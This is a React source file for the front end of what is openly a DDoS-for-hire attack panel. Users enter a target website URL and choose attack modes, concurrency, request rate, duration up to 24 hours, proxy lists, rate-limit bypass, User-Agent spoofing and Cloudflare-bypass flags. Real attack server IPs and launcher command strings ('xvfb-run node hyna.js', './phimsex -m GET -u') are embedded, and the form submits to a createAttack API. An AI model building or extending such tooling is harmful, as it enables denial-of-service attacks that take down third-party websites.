'use client';

import React, { useEffect, useRef, useState } from 'react';
import { Select, Slider, Input, Form } from 'antd';
import { motion, AnimatePresence } from 'framer-motion';
import styled from 'styled-components';
// import { IAttackPayload, INITIAL_ATTACK_CONFIG, Setting } from "@/shared/type/attack";
import { FiMonitor } from 'react-icons/fi';
// import { useAttackContext } from '@/shared/context/AttackContextProvider';
// import { jwtDecode } from 'jwt-decode';
import SceneWrapper from '@/components/SceneWrapper';
import NoticeError from '@/components/notice/NoticeError';
import { IAttackPayload, INITIAL_ATTACK_CONFIG } from '@/shared/types/Attack';
import { createAttack } from '@/api/attack';

const { Option } = Select;
// const settings =  [
//     {
//       "createdAt": "2025-02-27 08:44:57",
//       "group": "death_sword_http",
//       "id": 138,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-27 08:44:57",
//       "value": [
//         {
//           "YES": "--full true --extra true -F true --ratelimit true -C CLOUDFLARE"
//         }
//       ]
//     },
//     {
//       "createdAt": "2025-02-21 15:07:36",
//       "group": "    ",
//       "id": 129,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-27 08:01:26",
//       "value": [
//         {
//           "BLADE": "xvfb-run node hyna.js"
//         },
//         {
//           "DEATH SWORD": "./phimsex -m GET -u"
//         }
//       ]
//     },
//     {
//       "createdAt": "2025-02-21 15:15:49",
//       "group": "spoof",
//       "id": 133,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-25 14:00:26",
//       "value": [
//         {
//           "YES": "true"
//         },
//         {
//           "NO": "false"
//         }
//       ]
//     },
//     {
//       "createdAt": "2025-02-21 15:14:22",
//       "group": "bypass_ratelimit",
//       "id": 132,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-25 14:00:13",
//       "value": [
//         {
//           "YES": "true"
//         },
//         {
//           "NO": "false"
//         }
//       ]
//     },
//     {
//       "createdAt": "2025-02-21 15:06:02",
//       "group": "concurrents",
//       "id": 127,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-25 13:32:10",
//       "value": [
//         {
//           "0": "0"
//         },
//         {
//           "25": "25"
//         },
//         {
//           "50": "50"
//         },
//         {
//           "75": "75"
//         },
//         {
//           "100": "100"
//         }
//       ]
//     },
//     {
//       "createdAt": "2025-02-21 15:11:06",
//       "group": "request",
//       "id": 131,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-25 13:30:10",
//       "value": [
//         {
//           "R_20": "20"
//         },
//         {
//           "40": "40"
//         },
//         {
//           "60": "60"
//         },
//         {
//           "80": "80"
//         },
//         {
//           "100": "100"
//         }
//       ]
//     },
//     {
//       "createdAt": "2025-02-25 07:02:34",
//       "group": "attack_time",
//       "id": 137,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-25 13:26:42",
//       "value": [
//         {
//           "1": "1"
//         },
//         {
//           "4": "4"
//         },
//         {
//           "8": "8"
//         },
//         {
//           "12": "12"
//         },
//         {
//           "16": "16"
//         },
//         {
//           "20": "20"
//         },
//         {
//           "24": "24"
//         }
//       ]
//     },
//     {
//       "createdAt": "2025-02-24 12:24:02",
//       "group": "core_strength",
//       "id": 134,
//       "type": "hyna_warrior",
//       "updatedAt": "2025-02-25 13:17:45",
//       "value": [
//         {
//           "HYNA POWER": "proxy.txt"
//         },
//         {
//           "RADIANT SABER": "proxy2.txt"
//         }
//       ]
//     }
// ]
// const serverOptions = [
//   { value: "64.112.72.50", label: "Server 1", ip: "64.112.72.50" },
//   { value: "91.202.4.121", label: "Server 2", ip: "91.202.4.121" },
// ];

// interface IServerAttackType {
//   value: string;
//   label: string;
//   ip: string;
// }

interface SliderSingleProps {
    concurrents: Record<number, string>;
    attack_time: Record<number, string>;
}

const Page = () => {
    
    // const { isAdmin  } = useAuth();
    // const isAdmin = true;

    const [form] = Form.useForm();

    const [typeAttack] = useState<IAttackPayload["typeAttack"]>(INITIAL_ATTACK_CONFIG.typeAttack);
    const formValuesRef = useRef<IAttackPayload>(INITIAL_ATTACK_CONFIG);
    // const [selectedServers, setSelectedServers] = useState<string[]>([]);
    // const [selected , setSelectedMode] = useState<boolean>(true);
    // const [selectValues, setSelectValues] = useState<Record<string, string>>({});
    const [error, setError] = useState("");
    
    // const groupOrder = ["concurrents", "core_strength", "mode", "attack_time", "request", "bypass_ratelimit", "spoof"];
    // const sliderGroups = ['concurrents', 'attack_time', 'request'];
    // const selectGroups = ['core_strength', 'mode', 'bypass_ratelimit', 'spoof', 'death_sword_http'];
    const states = [
        { value: 'hyna_warrior', label: 'HYNA WARRIOR' },
        { value: 'hyna_valkyra', label: 'HYNA VALKYRA' }
    ];

    // const renderSettingComponent = (setting: any) => {
        
    //     const title = setting.group.replace(/_/g, " ").toUpperCase();
        
    //     const groupDescriptions: { [key: string]: React.ReactNode } = {
    //         concurrents: "",
    //         core_strength: (
    //             <>
    //                 With <code>HYNA Power</code>, you can attack internationally blocked 
    //                 websites and vice versa. 
    //                 <code>Radiant Saber</code> is the core source from the underground world, 
    //                 please take advantage of this power properly!
    //             </>
    //         ),
    //         mode: (
    //             <>
    //             <code>Blade</code> mode is an attack that involves penetration systems and bypassing the victim's <code>Cloudflare</code> and <code>CloudFront</code> protections. In contrast, <code>Death Sword</code> is a brute-force assault aimed at overwhelming the opponent by targeting <code>bandwidth sockets</code>.
    //             </>
    //         ),
    //         attack_time: "",
    //         request: "",
    //         bypass_ratelimit: (<>Rate Limit or No rate limit <code>bypassing</code> for the attack</>),
    //         spoof: (<>Spoofing <code>multiple</code>User-Agents to DDoS a website</>),
    //         death_sword_http: (<>Use <code>Death Sword</code> to perform a <code>brute force attack</code> on a website with advanced <code>Cloudflare protection</code></>),
    //         servers: "",
    //     };
      
    //     const description = groupDescriptions[setting.group];

    //     if (sliderGroups.includes(setting.group)) {

    //         const marks = setting.value.reduce((acc: any, curr: any) => {
    //         const key = Object.keys(curr)[0];
    //         const num = Number(key.replace(/\D/g, '')); 
        
    //         acc[num] = curr[key];
    //         return acc;
        
    //     }, {});

    //     const markValues = Object.keys(marks).map(Number).sort((a, b) => a - b);
    //     const minValue = markValues[0];
    //     const maxValue = markValues[markValues.length - 1];
    //     const defaultValue = Number(Object.keys(setting.value[0])[0].replace(/\D/g, '')) || minValue;
        
    //     const [value, setValue] = useState(defaultValue);
        
    //     const onChange = (newValue: number) => {
    //         setValue(newValue);
    //         formValuesRef.current[setting.group] = newValue;
    //     };  

    //     if (setting.group === "request") {
    //         return (
    //           <div key={setting.id} className="flex flex-col border rounded-md bg-card p-3 h-full">
    //             <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">{title}</div>
    //             {description && (
    //               <div className="text-sm text-primary mb-3">{description}</div>
    //             )}
    //             <Slider 
    //                 value={value}
    //                 onChange={onChange}
    //                 min={minValue}
    //                 max={maxValue}
    //             />
    //             <div className="mt-3 flex justify-between items-center">
    //               {markValues.map((step, i) => (
    //                 <div
    //                   key={i}
    //                   onClick={() => onChange(step)}
    //                   className={`p-2 rounded text-center cursor-pointer border transition-all duration-300 ease-in-out hover:opacity-90 text-xs ${value === step ? 'bg-primary text-black' : 'text-[#00ff00] bg-[#202020] border-[#00ff00]'}`}
    //                 >
    //                   Set range [{step}]
    //                 </div>
    //               ))}
    //             </div>
    //           </div>
    //         );
    //     }
        
    //     return (
    //         <div key={setting.id} className="flex flex-col border rounded-md bg-card p-3 h-full">
    //             <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">{title}</div>
    //             {description && (
    //                 <div className="text-sm text-primary mb-3">{description}</div>
    //             )}
    //             <Slider 
    //                 marks={marks}
    //                 onChange={onChange}
    //                 value={value}
    //                 min={minValue}
    //                 max={maxValue}
    //             />
    //         </div>
    //       );
    //     }
    //     if (selectGroups.includes(setting.group)) {
    //         const onChangeSelect: SelectProps['onChange'] = (value) => {
    //             setSelectValues((prev) => ({
    //                 ...prev,
    //                 [setting.group]: value,
    //               }));
    //             formValuesRef.current[setting.group] = value;
    //             if(setting.group === "mode") {
    //                 if (formValuesRef.current.mode == 'xvfb-run node hyna.js'){
    //                     setSelectedMode(true);
    //                 } else {
    //                     setSelectedMode(false);
    //                 }
    //             }
    //         };  

    //         const options = setting.value.map((opt: any) => {
    //             const key = Object.keys(opt)[0];
    //             return { value: opt[key], label: key };
    //         });
    //         const currentValue =
    //             selectValues[setting.group] ?? options[0]?.value;
    //     return (
    //         <div key={setting.id} className="flex flex-col border rounded-md bg-card p-3 h-full">
    //             <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">{title}</div>
    //             {description && (
    //                 <div className="text-sm text-primary mb-3">{description}</div>
    //             )}
    //             <CustomSelectStyled 
    //                 size="large" 
    //                 options={options} 
    //                 onChange={onChangeSelect}
    //                 value={currentValue}
    //             />
    //         </div>
    //       );
    //     }
    //     return null;
    // };

    // const renderGroupedSettings = () => {
    //     const filteredSettings = settings.filter(
    //         (setting) => setting.type === typeAttack
    //     );
    //     let finalSettings = [...filteredSettings];
    //     if (selectedMode === true) {
    //         finalSettings = finalSettings.filter(setting => setting.group !== "spoof" && setting.group !== "death_sword_http");
    //     }
    //     console.log(finalSettings);
    //     const sortedSettings = finalSettings.sort((a, b) => {
    //     const aIndex = groupOrder.indexOf(a.group);
    //     const bIndex = groupOrder.indexOf(b.group);
    //     if (aIndex !== -1 && bIndex !== -1) return aIndex - bIndex;
    //     if (aIndex !== -1) return -1;
    //     if (bIndex !== -1) return 1;
    //     return a.group.localeCompare(b.group);
    //     });
    //     return sortedSettings.map((setting, index) => {
    //         const isLastOdd = sortedSettings.length % 2 !== 0 && index === sortedSettings.length - 1;
    //         return (
    //             <div key={setting.id} className={isLastOdd ? "col-span-2" : "col-span-1"}>
    //             {renderSettingComponent(setting)}
    //             </div>
    //         );
    //     });
    // };

    const rightPanelVariants = {
        initial: { opacity: 0, y: 100 },
        animate: { opacity: 1, y: 0 },  
        exit: { opacity: 0, y: -100 }
    };
    // const handleServerChange = (server: IServerAttackType) => {

    //     console.log(server);
    //     // Sử dụng functional update để tránh race condition
    //     setSelectedServers(prevServers => {
    //       const newSelected = prevServers.includes(server.value)
    //         ? prevServers.filter(s => s !== server.value)
    //         : [...prevServers, server.value];
          
    //       // Cập nhật giá trị trong Form
    //       form.setFieldsValue({ servers: newSelected });
          
    //       return newSelected;
    //     });
    //   };
    const concurrents: SliderSingleProps['concurrents'] = {
        0: '0',
        25: '25',
        50: '50',
        75: '75',
        100: '100'
    };

    const attack_time: SliderSingleProps['attack_time'] = {
        1: '1h',
        4: '4h',
        8: '8h',
        12: '12h',
        16: '16h',
        20: '20h',
        24: '1day',
    };
    const [selectedMode, setSelectedMode] = useState('xvfb-run node hyna.js');
    useEffect(() => {
        const subscription = form.getFieldValue('mode');
        subscription?.props?.onChange?.(form.getFieldValue('mode'));
    }, [form]);

    const handleModeChange = (value: any) => {
        setSelectedMode(value);
        // Reset các giá trị liên quan nếu cần
        if (value === 'xvfb-run node hyna.js') {
            // Reset DEATH_SWORD_HTTP khi chuyển sang BLADE
            form.setFieldsValue({ death_sword_http: '' });
        } else if (value === './phimsex -m GET -u') {
            // Reset SPOOF khi chuyển sang DEATH SWORD
            form.setFieldsValue({ spoof: '' });
        }
    };

    const RightPanelContent = () => (
        <div className="h-full grid gap-4" style={{ gridTemplateColumns: 'repeat(2, 1fr)'}}>
            {/* {renderGroupedSettings()} */}
            <div className="flex flex-col card">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-3">CONCURRENTS</div>
                <Form.Item name="concurrents" className="mb-0" initialValue={0}>
                    <Slider  step={1} marks={concurrents}/>
                </Form.Item>
            </div>
            <div className="flex flex-col card">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">CORE STRENGTH</div>
                <div className="text-sm text-primary mb-3">
                    With <code>HYNA Power</code>, you can attack internationally blocked 
                    websites and vice versa. 
                    <code>Radiant Saber</code> is the core source from the underground world, 
                    please take advantage of this power properly!
                </div>
                <Form.Item name="core_strength" className="mb-0" initialValue={'proxy.txt'}>
                    <CustomSelectStyled 
                        size='large'
                        options={[{ value: 'proxy.txt', label: 'HYNA POWER' }, { value: 'proxy2.txt', label: 'RADIANT SABER' }]}
                    />
                </Form.Item>
            </div>
            <div className="flex flex-col card">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">MODE</div>
                <div className="text-sm text-primary mb-3">
                    <code>Blade</code> mode is an attack that involves penetration systems and bypassing the victim&apos;s <code>Cloudflare</code> and <code>CloudFront</code> protections. In contrast, <code>Death Sword</code> is a brute-force assault aimed at overwhelming the opponent by targeting <code>bandwidth sockets</code>.
                </div>
                <Form.Item name="mode" className="mb-0" initialValue={'xvfb-run node hyna.js'} >
                    <CustomSelectStyled 
                        size='large'
                        onChange={handleModeChange}
                        options={[{ value: 'xvfb-run node hyna.js', label: 'BLADE' }, { value: './phimsex -m GET -u', label: 'DEATH SWORD' }]}
                    />
                </Form.Item>
            </div>
            <div className="flex flex-col card">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-3">ATTACK TIME</div>
                <Form.Item name="attack_time" className="mb-0" initialValue={1} >
                    <Slider  min={1} max={24} marks={attack_time}/>
                </Form.Item>
            </div>
            <Request />
            <div className="flex flex-col card">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">BYPASS RATE LIMIT</div>
                <div className="text-sm text-primary mb-3">
                    Rate Limit or No rate limit <code>bypassing</code> for the attack
                </div>
                <Form.Item name="bypass_ratelimit" className="mb-0" initialValue={true} >
                    <CustomSelectStyled 
                        size='large'
                        options={[{ value: true, label: 'YES ' }, { value: false, label: 'NO' }]}
                    />
                </Form.Item>
            </div>

            {selectedMode === 'xvfb-run node hyna.js' && (
                <div className="flex flex-col card col-span-2">
                    <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">SPOOF</div>
                    <div className="text-sm text-primary mb-3">
                        Spoofing <code>multiple</code>User-Agents to DDoS a website
                    </div>
                    <Form.Item name="spoof" className="mb-0" initialValue={''} >
                        <CustomSelectStyled 
                            size='large'
                            options={[{ value: '--spoof true', label: 'YES' }, { value: '', label: 'NO' }]}
                        />
                    </Form.Item>
                </div>
            )}
            
            {/* Hiển thị DEATH SWORD HTTP chỉ khi mode là DEATH SWORD */}
            {selectedMode === './phimsex -m GET -u' && (
                <div className="flex flex-col card col-span-2">
                    <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">DEATH SWORD HTTP</div>
                    <div className="text-sm text-primary mb-3">
                        Use <code>Death Sword</code> to perform a <code>brute force attack</code> on a website with advanced <code>Cloudflare protection</code>
                    </div>
                    <Form.Item name="death_sword_http" className="mb-0" initialValue={''} >
                        <CustomSelectStyled 
                            size='large'
                            options={[{ value: '--full true --extra true -F true --ratelimit true -C CLOUDFLARE', label: 'YES' }, { value: '', label: 'NO' }]}
                        />
                    </Form.Item>
                </div>
            )}
            
            {/* <div className="flex flex-col card">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">SPOOF</div>
                <div className="text-sm text-primary mb-3">
                    Spoofing <code>multiple</code>User-Agents to DDoS a website
                </div>
                <Form.Item name="spoof" className="mb-0" initialValue={''} >
                    <CustomSelectStyled 
                        size='large'
                        options={[{ value: '--spoof true', label: 'YES' }, { value: '', label: 'NO' }]}
                    />
                </Form.Item>
            </div>
            <div className="flex flex-col card">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">DEATH SWORD HTTP</div>
                <div className="text-sm text-primary mb-3">
                    Use <code>Death Sword</code> to perform a <code>brute force attack</code> on a website with advanced <code>Cloudflare protection</code>
                </div>
                <Form.Item name="death_sword_http" className="mb-0" initialValue={''} >
                    <CustomSelectStyled 
                        size='large'
                        options={[{ value: '--full true --extra true -F true --ratelimit true -C CLOUDFLARE', label: 'YES' }, { value: '', label: 'NO' }]}
                    />
                </Form.Item>
            </div> */}

            <div className="flex flex-col card col-span-2">
                <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">SERVERS</div>
                <div className="text-sm text-primary mb-3">
                    MODE: <code>DEVIL</code>
                </div>
                <Form.Item name="servers" className="mb-0">
                    <CustomSelectStyled
                        mode="multiple"
                        size='large'
                        placeholder="Server enter"
                        optionLabelProp="label"
                        className='custom'
                    >
                        <Option value="23.229.7.14" label={<span>Server 1 <span style={{ color: '#999', marginLeft: 8 }}>23.229.7.14</span></span>}>
                            <div className="flex flex-col">
                                <div className="flex items-center gap-2">
                                    <FiMonitor className="text-xl" />
                                    <span>Server 1</span>
                                </div>
                            <div className="text-xs text-gray-500">23.229.7.14</div>
                            </div>
                        </Option>
                    </CustomSelectStyled>
                </Form.Item>
            </div>
        </div>
    );
  
    // const getSelectedLabel = () => {
    //     const selected = states.find(state => state.value === typeAttack);
    //     return selected ? selected.label : '';
    // };
    const onFinish = async (values: any) => {
        const attackTimeInSeconds = values.attack_time * 3600;
        const payload = {
          ...formValuesRef.current,
          ...values,
          attack_time: attackTimeInSeconds
        };
        if(payload.mode === 'xvfb-run node hyna.js') {
            delete payload.death_sword_http
        }
        if(payload.mode === './phimsex -m GET -u') {
            delete payload.spoof
        }
        try {   
            const result = await createAttack(payload);
            console.log(result);
        } catch (error) {
            console.log(error);
        }
    };    

    return (
        <div className="inner-body">
            {error && (
                <NoticeError error={error} setError={setError} myClass="text-5xl mb-0 leading-[3.5rem]" />
            )}
            <Form onFinish={onFinish} form={form} layout="vertical">
                <div className="content-body" style={{ minHeight: 'auto' }}>
                    <div className="mx-auto p-6">
                        <div className="h-full flex gap-x-6">
                            <div className="h-full p-4 flex flex-col w-[525px] min-w-[525px] max-w-[525px] fixed t-0 l-0">
                                <SceneWrapper height="h-[410px]" />
                                <div className="mb-2">
                                    {/* <h2 className="text-center text-primary text-xxl font-extrabold">STATE : {getSelectedLabel()}</h2> */}
                                    <div className="flex flex-col cards col-span-2">
                                        <div className="text-base text-primary mb-2">
                                        Consider between <code>HYNA Valkyra</code> and <code>HYNA Warrior</code> for the most effective attack
                                        </div>
                                        <Form.Item name="domain" className="mb-0">
                                            <CustomInputStyled size='large' className="mb-2" autoComplete="off" placeholder="Enter url website" />
                                        </Form.Item>
                                        <Form.Item name="typeAttack" className="mb-0" initialValue={typeAttack}>
                                            <CustomSelectStyled 
                                                size='large'
                                                options={states}
                                                />
                                        </Form.Item>
                                    </div>
                                </div>
                                <button type="submit" className="font-black py-3 bg-primary float-end text-black text-4xl rounded transition-all duration-300 ease-in-out active:opacity-10 hover:shadow-md hover:shadow-[#00ff00]">
                                    ATTACK
                                </button>
                            </div>
                            <div className="right-panel" style={{ marginLeft: "525px", width: "calc(100% - 525px)"}}>
                                <AnimatePresence mode="wait">
                                    <motion.div
                                        key={typeAttack}
                                        variants={rightPanelVariants}
                                        initial="initial"
                                        animate="animate"
                                        exit="exit"
                                        transition={{ duration: 0.3 }}
                                        style={{ flexGrow: 1 }}
                                    >
                                        <RightPanelContent />
                                    </motion.div>
                                </AnimatePresence>
                            </div>
                        </div>
                    </div>
                </div>
            </Form>
        </div>
    );
};


const Request: React.FC = () => {

    const [value, setValue] = useState(20);
    const steps = [20, 40, 60 , 80, 100];

    const onChange = (newValue: number) => {
    console.log(newValue)
    setValue(newValue);
    };
    console.log(value);
        
    return (
        <div className="flex flex-col border rounded-md bg-card p-3">
            <div className="font-bold text-primary text-[30px] leading-[normal] mb-2">REQUESTS</div>
            <Form.Item name="request" className="mb-0" initialValue={value}>
                <Slider 
                    
                    value={value}
                    onChange={onChange} 
                    max={100}
                    step={1}
                    />
            </Form.Item>
            <div className="mt-3 flex justify-between items-center">
                {steps.map((step, i) => (
                <div
                    key={i}
                    onClick={() => onChange(step)}
                    className={`p-2 rounded text-center cursor-pointer border transition-all duration-300 ease-in-out hover:opacity-90 text-xs ${value === step ? 'bg-primary text-black' : 'text-[#00ff00] bg-[#202020] border-[#00ff00]'}`}
                >
                    Set range [{step}]
                </div>
                ))
                }
            </div>
        </div>
    )
}

// interface ServerProps {
//     selectedServers: string[];
//     handleServerChange: (server: IServerAttackType) => void;
//   }

const CustomInputStyled = styled(Input)`
    border-radius: 0.375rem;
    color: rgb(0, 255, 0) !important;
    border: 0.0625rem solid #444444 !important;
    background: #202020 !important;
    &::placeholder {
        color: #666;
    }
    .ant-input-outlined {
        background: #2c2c2c !important;
        border-radius: 0.375rem;
        color: #fff;
        border: 0.0625rem solid #444444 !important;
        outline: none !important; /* Bỏ outline cho input thông thường nếu có */
    }
}

`;

const CustomSelectStyled = styled(Select)`

  .ant-select-selection-item-remove {
    color: rgb(0, 255, 0) !important;
  }

  .ant-form-item-label > label {
    font-size: 1.125rem;
    line-height: normal;
    margin-bottom: 0px !important;
    font-weight: 500;
    color: rgb(0, 255, 0) !important;
  }

  .ant-input-outlined {
    background: #2c2c2c !important;
    border-radius: 0.375rem;
    color: #fff;
    border: 0.0625rem solid #444444 !important;
  }

  .ant-select-selector {
    border-radius: 0.375rem;   
    border: 0.0625rem solid #444444 !important;
    background: #202020 !important;
  }

  .ant-select-selection-placeholder, .ant-select-selection-item {
    line-height: normal;
    font-weight: 500;
    color: rgb(255, 255, 255) !important;
  }

  .custom .ant-select-selector {
        padding: 12px
    }
`;

export default Page;